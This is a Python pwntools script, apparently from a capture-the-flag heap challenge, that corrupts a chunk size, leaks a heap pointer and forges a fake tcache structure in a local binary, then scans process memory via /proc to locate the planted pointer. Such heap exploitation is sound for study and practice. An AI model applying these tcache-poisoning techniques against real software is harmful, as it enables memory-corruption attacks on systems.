import os, sys, struct
from pwn import *
context.log_level = 'info'
context.arch = 'amd64'
HERE = './_z_441'
io = process(os.path.join(HERE, 'hft'), env={})

def rd(addr, n):
    with open('/proc/%d/mem' % io.pid, 'rb') as f:
        f.seek(addr)
        return f.read(n)

def regions():
    out = []
    for line in open('/proc/%d/maps' % io.pid):
        p = line.split()
        a, b = [int(x, 16) for x in p[0].split('-')]
        out.append((a, b, p[1], p[-1] if len(p) > 5 else ''))
    return out

def maps(pat):
    for a, b, perm, name in regions():
        if pat in name:
            return a
    return None

def alloc(size, data=b''):
    io.recvuntil(b"PKT_RES")
    io.send(p64(size))
    io.send(bytes(data) + b"\n")

def echo():
    io.recvuntil(b"PKT_DATA\x1b[m:[")
    buf = io.recvuntil(b"\x1b[1;34mPKT_INFO", drop=True)
    return buf[:-2]

ECHO6 = b"\x01" + b"\x00"*5
alloc(0x10, b"\x00"*8)
alloc(0x10, p64(0) + p64(0) + p64(0xd31))
alloc(0x1000, b"\x00"*8)
alloc(0x8, ECHO6)
leak = u64(echo()[:6].ljust(8, b"\x00"))
heap = maps('[heap]')
log.info("heap=%#x" % heap)

fake_tcache = heap + 0x22020
st = bytearray(0x290)
def sc(i, v): st[2*i] = v & 0xff; st[2*i+1] = (v >> 8) & 0xff
def se(i, v): st[0x80+8*i:0x88+8*i] = p64(v)
sc(0, 1); se(0, heap + 0x2e0)
sc(63, 1); se(63, fake_tcache - 0x10)
alloc(0x1000, bytes(st[8:0x290]))

libc_base = maps('441_libc.so.6')
log.info("libc=%#x" % libc_base)
log.info("--- maps (rw anon + libc) ---")
for a, b, perm, name in regions():
    if ('rw' in perm and (name == '' or 'libc' in name or 'heap' in name)):
        log.info("  %#x-%#x %s %s" % (a, b, perm, name))

alloc(0x30001, b"A"*0x316e0 + p64(fake_tcache))
log.info("--- after mmap: maps ---")
for a, b, perm, name in regions():
    if ('rw' in perm and (name == '' or 'libc' in name or 'heap' in name)):
        log.info("  %#x-%#x %s %s" % (a, b, perm, name))
# scan all rw anon regions in the 0x20000 range below libc for our value
for a, b, perm, name in regions():
    if a < libc_base and a > libc_base - 0x100000 and 'rw' in perm:
        d = rd(a, min(b-a, 0x4000))
        for off in range(0, len(d)-8, 8):
            v = u64(d[off:off+8])
            if v == fake_tcache:
                log.info("  FOUND fake_tcache at %#x (region %#x-%#x %s)" % (a+off, a, b, name))
io.close()
